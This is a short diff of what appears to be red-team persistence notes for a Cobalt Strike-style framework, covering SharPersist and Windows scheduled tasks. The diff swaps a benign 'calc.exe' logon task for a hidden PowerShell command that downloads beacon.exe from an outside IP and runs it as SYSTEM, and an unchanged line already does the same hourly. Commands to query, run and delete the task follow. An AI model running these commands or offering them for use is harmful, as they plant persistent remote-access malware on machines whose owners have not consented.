@@ -44,7 +44,7 @@ execute-assembly /root/SharPersist.exe -t service -n "Name" -m remove
 There is a length limit on the tr value in the schtasks tool, also the single quote doesn't exist.
 ```powershell
 shell schtasks /create /sc hourly /mo 1 /tn evil /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c \"Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe\" "
-shell schtasks /create /sc onlogon /tn evil /tr "calc.exe" /ru SYSTEM
+shell schtasks /create /sc onlogon /tn evil /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c \"Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe\" " /ru SYSTEM
 shell schtasks /query /tn evil /V /FO LIST
 shell schtasks /run /tn evil
 shell schtasks /delete /tn evil
